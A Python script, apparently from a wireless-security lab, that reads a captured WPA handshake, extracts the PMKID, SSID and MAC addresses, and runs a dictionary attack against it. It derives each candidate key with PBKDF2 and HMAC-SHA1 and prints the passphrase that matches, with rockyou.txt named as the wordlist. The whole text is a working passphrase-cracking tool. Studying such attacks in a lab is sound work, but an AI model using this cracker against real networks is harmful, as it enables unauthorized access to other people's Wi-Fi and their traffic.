#!/usr/bin/env python3

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
import hmac, hashlib


def customPRF512(key, A, B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]


wpa = rdpcap("PMKID_handshake.pcap")

dictionary = "dict_test.txt"
# "rockyou.txt"  # this is the dictionary containing all words to test
A = b"PMK Name"
ssid = wpa[0].info.decode('utf-8')
APmac = a2b_hex(wpa[145].addr2.replace(':', ''))
Clientmac = a2b_hex(wpa[145].addr1.replace(':', ''))

pmkid = wpa[145].original[-20:-4]

pmk_msg = A + APmac + Clientmac

print("\n\nValues used to derivate keys")
print("============================")
print("Dictionary file : ", dictionary, "\n")
print("SSID: ", ssid, "\n")
print("AP Mac: ", b2a_hex(APmac), "\n")
print("CLient Mac: ", b2a_hex(Clientmac), "\n")
print("PMKID: ", pmkid, "\n")
print("PMK msg: ", b2a_hex(pmk_msg), "\n")

with open(dictionary, "r") as passphrases:
    index = 0
    for passphrase in passphrases:
        passphrase = passphrase.strip('\n')
        if index % 100 == 0:
            print("{}: {}".format(index, passphrase))

        pmk = pbkdf2(hashlib.sha1, str.encode(passphrase), ssid.encode(), 4096, 32)

        test = hmac.new(pmk, pmk_msg, hashlib.sha1)

        index += 1
        # b'7fd0bc061552217e942d19c6686f1598'
        if test.digest()[:-4] != pmkid:
            continue
        print("Passphrase found : \"{}\". {} attempts".format(passphrase, index))
        break
